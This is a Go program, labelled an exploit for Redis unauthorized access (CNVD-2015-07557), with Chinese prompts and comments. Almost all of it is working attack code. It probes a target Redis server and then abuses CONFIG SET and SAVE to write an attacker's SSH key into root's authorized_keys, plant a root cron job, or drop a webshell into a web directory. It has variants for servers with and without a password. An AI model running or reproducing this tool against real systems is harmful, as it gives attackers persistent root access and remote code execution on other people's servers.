/*
 * @Author: twsec
 * @Date: 2022-12-24 15:32:16
 * @LastEditors: twsec
 * @LastEditTime: 2023-01-30 14:09:11
 * @Description:redis未授权访问-EXP
 */
package main

import (
	"fmt"
	"io"

	"net"
	"os"

	"regexp"

	_ "github.com/aloxc/gobanner/banner"
)

func main() {

	//输出多行字符串
	fmt.Println(`CNVD-2015-07557-EXP编译合适的版本，根据提示输入地址和命令即可执行命令！
         
 
         想念你的时候，我会用你的名字喊醒自己。
 
                             --《我想和你叙叙旧》`)

	var Target string
	var Port string
	var Password string
	fmt.Println("请输入地址(0.0.0.0)：")
	fmt.Scanln(&Target)

	fmt.Println("请输入redis端口(6379)：")

	fmt.Scanln(&Port)
	fmt.Println("请输入redis密码，如果无密码可留空：")

	fmt.Scanln(&Password)
	if Password == "" {

		Nhavep(Target, Port)
	} else {
		var cos string
		fmt.Println("请输入要进行的操作，ssh为写入公钥，cron为写入定时任务，dir为判断路径是否存在，web为写入webshell：")
		fmt.Scan(&cos)
		if cos == "ssh" {
			Havepssh(Target, Port, Password)
		}
		if cos == "cron" {
			Havepcron(Target, Port, Password)
		}
		if cos == "dir" {
			Havepdir(Target, Port, Password)
		}
		if cos == "web" {
			Havepweb(Target, Port, Password)
		}

	}
}

func Nhavep(Target string, Port string) {

	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}

	//发送info命令
	conn.Write([]byte("info\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}

	flag1 := "redis_version:"
	//判断接收的数据是否包含redis_version
	if ok, _ := regexp.Match(flag1, buf[:n]); ok {
		//正则匹配redis版本
		reg := regexp.MustCompile(`redis_version:(.*)`)
		redis_version := reg.FindAllStringSubmatch(string(buf[:n]), -1)
		fmt.Println("redis版本为：", redis_version[0][1])
		fmt.Println("存在redis未授权访问漏洞！")
		//关闭连接
		conn.Close()
		//新建连接
		conn, err := net.Dial("tcp", Target+":"+Port)
		if err != nil {
			fmt.Println("连接失败！")
			return
		}

		//发送设置目录为/root/.ssh/命令
		conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
		//接收返回数据
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag2 := "OK"
		if ok, _ := regexp.Match(flag2, buf[:n]); ok {
			//获取当前目录
			conn.Write([]byte("CONFIG GET dir\r\n"))
			//接收返回数据
			buf = make([]byte, 1024)
			n, err = conn.Read(buf)
			if err != nil {
				fmt.Println("接收数据失败！")
				return
			}

			//输出当前目录
			fmt.Println("当前目录为：", string(buf[:n]))
			//输出设置目录成功

			fmt.Println("设置目录为/root/.ssh/成功！")
		} else {
			//获取当前目录
			conn.Write([]byte("CONFIG GET dir\r\n"))
			//接收返回数据
			buf = make([]byte, 1024)
			n, err = conn.Read(buf)
			if err != nil {
				fmt.Println("接收数据失败！")
				return
			}
			//输出当前目录
			fmt.Println("当前目录为：", string(buf[:n]))
			fmt.Println("设置目录为/root/.ssh/失败！")
			//return
		}
		//发送设置目录为/var/spool/cron/crontabs
		conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag3 := "OK"
		if ok, _ := regexp.Match(flag3, buf[:n]); ok {
			//获取当前目录
			conn.Write([]byte("CONFIG GET dir\r\n"))
			//接收返回数据
			buf = make([]byte, 1024)
			n, err = conn.Read(buf)
			if err != nil {
				fmt.Println("接收数据失败！")
				return
			}

			//输出当前目录
			fmt.Println("当前目录为：", string(buf[:n]))
			//输出设置目录成功
			fmt.Println("设置目录为/var/spool/cron/crontabs/成功！")

		} else {
			//获取当前目录
			conn.Write([]byte("CONFIG GET dir\r\n"))
			//接收返回数据
			buf = make([]byte, 1024)
			n, err = conn.Read(buf)
			if err != nil {
				fmt.Println("接收数据失败！")
				return
			}
			//输出当前目录
			fmt.Println("当前目录为：", string(buf[:n]))
			fmt.Println("设置目录为/var/spool/cron/crontabs/失败！")
			//return
		}
		var cos string
		fmt.Println("请输入要进行的操作，ssh为写入公钥，cron为写入定时任务，dir为判断路径是否存在，web为写入webshell：")
		fmt.Scan(&cos)
		if cos == "ssh" {
			Nhavepssh(Target, Port)
		} else if cos == "cron" {
			Nhavepcron(Target, Port)
		}
		if cos == "dir" {
			Nhavepdir(Target, Port)
		}
		if cos == "web" {
			Nhavepweb(Target, Port)
		}

	} else {
		fmt.Println("不存在redis未授权访问漏洞！")
	}

}

func Nhavepssh(Target string, Port string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	defer conn.Close()
	//发送设置目录为/root/.ssh/
	conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为/root/.ssh/成功！")
	} else {
		//输出设置目录失败
		fmt.Println("设置目录为/root/.ssh/失败！")
		return
	}

	//设置dbfilename为authorized_keys
	conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag3 := "OK"
	if ok, _ := regexp.Match(flag3, buf[:n]); ok {
		//输出设置dbfilename成功
		fmt.Println("设置dbfilename为authorized_keys成功！")
		var PublicKey string
		//读取文件
		file, err := os.Open("pub_key.txt")
		if err != nil {
			fmt.Println("读取文件失败！")
			return
		}
		defer file.Close()
		//读取文件内容
		buf := make([]byte, 1024)
		for {
			n, err := file.Read(buf)
			if err != nil {
				if err == io.EOF {
					break
				}
				fmt.Println("读取文件内容失败！")
				return
			}
			PublicKey += string(buf[:n])
		}
		//println(PublicKey)

		//写入公钥

		conn.Write([]byte("set x \"\\n\\n\\n" + PublicKey + "\\n\\n\\n\"\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag4 := "OK"
		if ok, _ := regexp.Match(flag4, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("写入公钥成功！")
		} else {
			fmt.Println("写入公钥失败！")
			return
		}

		//发送保存命令
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag5 := "OK"
		if ok, _ := regexp.Match(flag5, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("保存成功！")
		} else {
			fmt.Println("保存失败！")
			fmt.Println(string(buf[:n]))
			return
		}
		//发送删除key命令
		conn.Write([]byte("DEL x\r\n"))

	} else {
		fmt.Println("设置dbfilename为authorized_keys失败！")
		return
	}
}

func Nhavepcron(Target string, Port string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	defer conn.Close()
	//发送设置目录为/var/spool/cron/
	conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为/var/spool/cron/crontabs成功！")
	} else {
		//输出设置目录失败
		fmt.Println("设置目录为/var/spool/cron/crontabs失败！")
		return
	}
	//设置dbfilename为root
	conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {

		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag3 := "OK"

	if ok, _ := regexp.Match(flag3, buf[:n]); ok {
		//输出设置dbfilename成功
		fmt.Println("设置dbfilename为root成功！")
		var Cron string

		//读取文件
		file, err := os.Open("cron.txt")
		if err != nil {
			fmt.Println("读取文件失败！")
			return
		}
		defer file.Close()
		//读取文件内容
		buf := make([]byte, 1024)
		for {
			n, err := file.Read(buf)
			if err != nil {
				if err == io.EOF {
					break
				}
				fmt.Println("读取文件内容失败！")
				return
			}
			Cron += string(buf[:n])
		}
		//输出Cron内容
		//fmt.Println(Cron)
		//发送crontab内容
		conn.Write([]byte("set xx \"\\n" + Cron + "\\n\"\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag4 := "OK"
		if ok, _ := regexp.Match(flag4, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("写入crontab内容成功！")
		} else {
			fmt.Println("写入crontab内容失败！")
			return
		}

		//发送保存命令
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)

		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag5 := "OK"
		if ok, _ := regexp.Match(flag5, buf[:n]); ok {

			//输出设置dbfilename成功
			fmt.Println("保存成功！")
		} else {
			fmt.Println("保存失败！")
			fmt.Println(string(buf[:n]))
			return
		}
		//发送删除key命令
		conn.Write([]byte("DEL xx\r\n"))

	} else {
		fmt.Println("设置dbfilename为root失败！")
		return
	}

}

func Nhavepdir(Target string, Port string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	defer conn.Close()
	//获取用户输入的目录
	var Dir string
	fmt.Println("请输入要测试的目录：")
	fmt.Scan(&Dir)
	//发送设置目录为用户输入的目录
	conn.Write([]byte("CONFIG SET dir " + Dir + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为" + Dir + "成功！")
		//输出当前目录
		conn.Write([]byte("CONFIG GET dir\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前目录
		fmt.Println("当前目录为：" + string(buf[5:n-2]))

	} else {
		//输出设置目录失败
		fmt.Println("设置目录为" + Dir + "失败！")
		return
	}

}
func Nhavepweb(Target string, Port string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	defer conn.Close()
	//获取用户输入的网站绝对路径
	var Dir string
	fmt.Println("请输入网站绝对路径：")
	fmt.Scan(&Dir)
	//发送设置目录为用户输入的目录
	conn.Write([]byte("CONFIG SET dir " + Dir + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为" + Dir + "成功！")
		fmt.Println(Dir + "目录存在！")
		//输出当前目录
		conn.Write([]byte("CONFIG GET dir\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前目录
		fmt.Println("当前目录为：" + string(buf[5:n-2]))

	} else {
		//输出设置目录失败
		fmt.Println("设置目录为" + Dir + "失败！")
		return
	}
	//获取用户输入的文件名
	var Filename string
	fmt.Println("请输入要保存的文件名：")
	fmt.Scan(&Filename)
	//发送设置dbfilename为用户输入的文件名
	conn.Write([]byte("CONFIG SET dbfilename " + Filename + "\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 = "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置文件名成功
		fmt.Println("设置文件名为" + Filename + "成功！")
		//输出当前文件名
		conn.Write([]byte("CONFIG GET dbfilename\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前文件名
		fmt.Println("当前文件名为：" + string(buf[5:n-2]))
	} else {
		//输出设置文件名失败
		fmt.Println("设置文件名为" + Filename + "失败！")
		return
	}
	//获取用户输入的webshell
	var Webshell string
	//读取文件
	file, err := os.Open("webshell.txt")
	if err != nil {
		fmt.Println("读取文件失败！")
		return
	}
	defer file.Close()
	//读取文件内容
	buf = make([]byte, 1024)
	n, err = file.Read(buf)
	if err != nil {
		fmt.Println("读取文件内容失败！")
		return
	}
	Webshell = string(buf[:n])

	//发送设置webshell
	conn.Write([]byte("set xx \"\\n\\n\\n" + Webshell + "\\n\\n\\n\"\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 = "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置webshell成功
		fmt.Println("设置webshell为" + Webshell + "成功！")
		//save
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag2 = "OK"
		if ok, _ := regexp.Match(flag2, buf[:n]); ok {
			//输出保存成功
			fmt.Println("保存成功！")
		} else {
			//输出保存失败
			fmt.Println("保存失败！")
			return
		}
		//删除key
		conn.Write([]byte("del xx\r\n"))
	} else {
		//输出设置webshell失败
		fmt.Println("设置webshell为" + Webshell + "失败！")
		return
	}

}

func Havepssh(Target string, Port string, Password string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接redis失败！")
		return
	}
	//密码认证
	conn.Write([]byte("AUTH " + Password + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag := "OK"
	if ok, _ := regexp.Match(flag, buf[:n]); ok {
		//输出密码认证成功
		fmt.Println("密码认证成功！")
	} else {
		//输出密码认证失败
		fmt.Println("密码认证失败！")
		return
	}
	defer conn.Close()
	//发送设置目录为/root/.ssh/
	conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为/root/.ssh/成功！")
	} else {
		//输出设置目录失败
		fmt.Println("设置目录为/root/.ssh/失败！")
		return
	}

	//设置dbfilename为authorized_keys
	conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag3 := "OK"
	if ok, _ := regexp.Match(flag3, buf[:n]); ok {
		//输出设置dbfilename成功
		fmt.Println("设置dbfilename为authorized_keys成功！")
		var PublicKey string
		//读取文件
		file, err := os.Open("pub_key.txt")
		if err != nil {
			fmt.Println("读取文件失败！")
			return
		}
		defer file.Close()
		//读取文件内容
		buf := make([]byte, 1024)
		for {
			n, err := file.Read(buf)
			if err != nil {
				if err == io.EOF {
					break
				}
				fmt.Println("读取文件内容失败！")
				return
			}
			PublicKey += string(buf[:n])
		}
		//println(PublicKey)

		//写入公钥

		conn.Write([]byte("set x \"\\n\\n\\n" + PublicKey + "\\n\\n\\n\"\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag4 := "OK"
		if ok, _ := regexp.Match(flag4, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("写入公钥成功！")
		} else {
			fmt.Println("写入公钥失败！")
			return
		}

		//发送保存命令
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag5 := "OK"
		if ok, _ := regexp.Match(flag5, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("保存成功！")
		} else {
			fmt.Println("保存失败！")
			fmt.Println(string(buf[:n]))
			return
		}
		//发送删除key命令
		conn.Write([]byte("DEL x\r\n"))

	} else {
		fmt.Println("设置dbfilename为authorized_keys失败！")
		return
	}
}

func Havepcron(Target string, Port string, Password string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	//密码认证
	conn.Write([]byte("AUTH " + Password + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag := "OK"
	if ok, _ := regexp.Match(flag, buf[:n]); ok {
		//输出密码认证成功
		fmt.Println("密码认证成功！")
	} else {
		//输出密码认证失败
		fmt.Println("密码认证失败！")
		return
	}
	defer conn.Close()
	//发送设置目录为/var/spool/cron/
	conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为/var/spool/cron/crontabs成功！")
	} else {
		//输出设置目录失败
		fmt.Println("设置目录为/var/spool/cron/crontabs失败！")
		return
	}
	//设置dbfilename为root
	conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {

		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag3 := "OK"

	if ok, _ := regexp.Match(flag3, buf[:n]); ok {
		//输出设置dbfilename成功
		fmt.Println("设置dbfilename为root成功！")
		var Cron string

		//读取文件
		file, err := os.Open("cron.txt")
		if err != nil {
			fmt.Println("读取文件失败！")
			return
		}
		defer file.Close()
		//读取文件内容
		buf := make([]byte, 1024)
		for {
			n, err := file.Read(buf)
			if err != nil {
				if err == io.EOF {
					break
				}
				fmt.Println("读取文件内容失败！")
				return
			}
			Cron += string(buf[:n])
		}
		//输出Cron内容
		//fmt.Println(Cron)
		//发送crontab内容
		conn.Write([]byte("set xx \"\\n" + Cron + "\\n\"\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag4 := "OK"
		if ok, _ := regexp.Match(flag4, buf[:n]); ok {
			//输出设置dbfilename成功
			fmt.Println("写入crontab内容成功！")
		} else {
			fmt.Println("写入crontab内容失败！")
			return
		}

		//发送保存命令
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)

		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}

		//判断接收的数据是否包含OK
		flag5 := "OK"
		if ok, _ := regexp.Match(flag5, buf[:n]); ok {

			//输出设置dbfilename成功
			fmt.Println("保存成功！")
		} else {
			fmt.Println("保存失败！")
			fmt.Println(string(buf[:n]))
			return
		}
		//发送删除key命令
		conn.Write([]byte("DEL xx\r\n"))

	} else {
		fmt.Println("设置dbfilename为root失败！")
		return
	}

}

func Havepdir(Target string, Port string, Password string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	//密码认证
	conn.Write([]byte("AUTH " + Password + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag := "OK"
	if ok, _ := regexp.Match(flag, buf[:n]); ok {
		//输出密码认证成功
		fmt.Println("密码认证成功！")
	} else {
		//输出密码认证失败
		fmt.Println("密码认证失败！")
		return
	}
	defer conn.Close()
	//获取用户输入的目录
	var Dir string
	fmt.Println("请输入要测试的目录：")
	fmt.Scan(&Dir)
	//发送设置目录为用户输入的目录
	conn.Write([]byte("CONFIG SET dir " + Dir + "\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为" + Dir + "成功！")
		//输出当前目录
		conn.Write([]byte("CONFIG GET dir\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前目录
		fmt.Println("当前目录为：" + string(buf[5:n-2]))

	} else {
		//输出设置目录失败
		fmt.Println("设置目录为" + Dir + "失败！")
		return
	}

}
func Havepweb(Target string, Port string, Password string) {
	//连接redis
	conn, err := net.Dial("tcp", Target+":"+Port)
	if err != nil {
		fmt.Println("连接失败！")
		return
	}
	//密码认证
	conn.Write([]byte("AUTH " + Password + "\r\n"))
	//接收返回数据
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag := "OK"
	if ok, _ := regexp.Match(flag, buf[:n]); ok {
		//输出密码认证成功
		fmt.Println("密码认证成功！")
	} else {
		//输出密码认证失败
		fmt.Println("密码认证失败！")
		return
	}
	defer conn.Close()
	//获取用户输入的网站绝对路径
	var Dir string
	fmt.Println("请输入网站绝对路径：")
	fmt.Scan(&Dir)
	//发送设置目录为用户输入的目录
	conn.Write([]byte("CONFIG SET dir " + Dir + "\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 := "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置目录成功
		fmt.Println("设置目录为" + Dir + "成功！")
		fmt.Println(Dir + "目录存在！")
		//输出当前目录
		conn.Write([]byte("CONFIG GET dir\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前目录
		fmt.Println("当前目录为：" + string(buf[5:n-2]))

	} else {
		//输出设置目录失败
		fmt.Println("设置目录为" + Dir + "失败！")
		return
	}
	//获取用户输入的文件名
	var Filename string
	fmt.Println("请输入要保存的文件名：")
	fmt.Scan(&Filename)
	//发送设置dbfilename为用户输入的文件名
	conn.Write([]byte("CONFIG SET dbfilename " + Filename + "\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 = "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置文件名成功
		fmt.Println("设置文件名为" + Filename + "成功！")
		//输出当前文件名
		conn.Write([]byte("CONFIG GET dbfilename\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//输出当前文件名
		fmt.Println("当前文件名为：" + string(buf[5:n-2]))
	} else {
		//输出设置文件名失败
		fmt.Println("设置文件名为" + Filename + "失败！")
		return
	}
	//获取用户输入的webshell
	var Webshell string
	//读取文件
	file, err := os.Open("webshell.txt")
	if err != nil {
		fmt.Println("读取文件失败！")
		return
	}
	defer file.Close()
	//读取文件内容
	buf = make([]byte, 1024)
	n, err = file.Read(buf)
	if err != nil {
		fmt.Println("读取文件内容失败！")
		return
	}
	Webshell = string(buf[:n])

	//发送设置webshell
	conn.Write([]byte("set xx \"\\n\\n\\n" + Webshell + "\\n\\n\\n\"\r\n"))
	//接收返回数据
	buf = make([]byte, 1024)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("接收数据失败！")
		return
	}
	//判断接收的数据是否包含OK
	flag2 = "OK"
	if ok, _ := regexp.Match(flag2, buf[:n]); ok {
		//输出设置webshell成功
		fmt.Println("设置webshell为" + Webshell + "成功！")
		//save
		conn.Write([]byte("SAVE\r\n"))
		//接收返回数据
		buf = make([]byte, 1024)
		n, err = conn.Read(buf)
		if err != nil {
			fmt.Println("接收数据失败！")
			return
		}
		//判断接收的数据是否包含OK
		flag2 = "OK"
		if ok, _ := regexp.Match(flag2, buf[:n]); ok {
			//输出保存成功
			fmt.Println("保存成功！")
		} else {
			//输出保存失败
			fmt.Println("保存失败！")
			return
		}
		//删除key
		conn.Write([]byte("del xx\r\n"))
	} else {
		//输出设置webshell失败
		fmt.Println("设置webshell为" + Webshell + "失败！")
		return
	}
}
